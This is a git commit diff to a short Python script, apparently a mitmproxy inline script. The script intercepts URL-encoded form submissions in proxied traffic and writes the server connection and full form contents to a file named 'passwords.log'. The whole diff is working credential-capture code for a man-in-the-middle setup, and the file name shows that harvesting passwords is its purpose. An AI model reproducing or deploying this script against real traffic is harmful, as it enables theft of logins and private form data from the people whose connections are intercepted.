28cc9da3b3682b01355da8fcb1c4d21a77872fa9
Kostis Karantias <karantiaskostis@gmail.com>
2015-03-03 20:05:29 +0200

    Log form submissions to separate file

--- scripts/report_form_submissions.py
+++ scripts/report_form_submissions.py
@@ -1,7 +1,11 @@
+import logging
+
+logging.basicConfig(filename="passwords.log", level=logging.INFO)
+    
 def request(context, flow):
     if "application/x-www-form-urlencoded" in flow.request.headers["content-type"]:
-        context.log("New form submission")
-        context.log(str(flow.live.c.server_conn))
+        logging.info("New form submission")
+        logging.info(str(flow.live.c.server_conn))
         form = flow.request.get_form_urlencoded()
-        context.log(str(form))
+        logging.info(str(form))
         flow.request.set_form_urlencoded(form)
